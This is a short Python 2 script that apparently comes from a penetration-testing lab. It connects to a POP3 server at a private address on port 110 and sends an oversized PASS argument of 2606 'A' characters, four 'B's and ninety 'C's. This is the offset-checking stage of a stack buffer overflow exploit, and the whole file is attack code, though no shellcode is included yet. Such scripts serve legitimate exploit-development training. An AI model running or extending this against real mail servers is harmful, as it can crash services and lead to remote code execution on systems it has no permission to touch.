#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	buff = "A" * 2606 + "B" * 4 + "C" * 90

	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock_conn = sock.connect(("10.11.21.97", 110))
		data = sock.recv(1024)
		print data
	
		sock.send("USER test\r\n")
		data = sock.recv(1024)
		print data

		sock.send("PASS {0}\r\n".format(buff))
		data = sock.recv(1024)
		print data
	except socket.error:
		print("[x] Unable to connect...")
	finally:
		sock.close()
		sys.exit(0)

